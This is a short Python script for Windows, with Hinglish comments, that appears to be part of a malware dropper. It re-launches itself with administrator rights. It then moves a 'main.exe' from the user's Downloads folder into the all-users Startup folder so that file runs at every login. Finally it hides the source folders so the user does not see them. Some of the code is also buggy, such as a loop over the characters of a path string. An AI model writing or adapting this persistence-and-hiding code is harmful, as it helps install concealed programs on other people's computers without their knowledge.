import shutil
import os
import sys
import ctypes
import time
from main4 import hide_folder

time.sleep(2)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    # Re-run the program with administrator privileges
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
else:
    print("Running with admin privileges!")



def move_and_hide_file(source_file, destination_folder):
    # File ko dusre folder mein transfer karna
    shutil.move(source_file, destination_folder)  
    # Nayi file ka path
source_file = os.path.expanduser('~') + '\\Downloads\\dist\\main\\main.exe'
destination_folder = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
move_and_hide_file(source_file, destination_folder)
for source_files in source_file:
        try:
            shutil.move(source_files, destination_folder)
            # print(f"File {source_files} moved.")
            os.remove(source_files)
          # Remove the original file if needed
            # print(f"Original file {source_files} deleted.")
        except PermissionError as e:
            print(f"Permission error: {e}")
        except Exception as e:
            print(f"An error occurred: {e}")

current_folder = os.path.expanduser('~') + '\\Downloads\\dist'
hide_folder(current_folder)
# print("Folder is hidden!")


path = os.path.expanduser('~') + '\\Downloads\\dist\\main'
hide_folder(path)
# print("2nd Folder is hidden!")
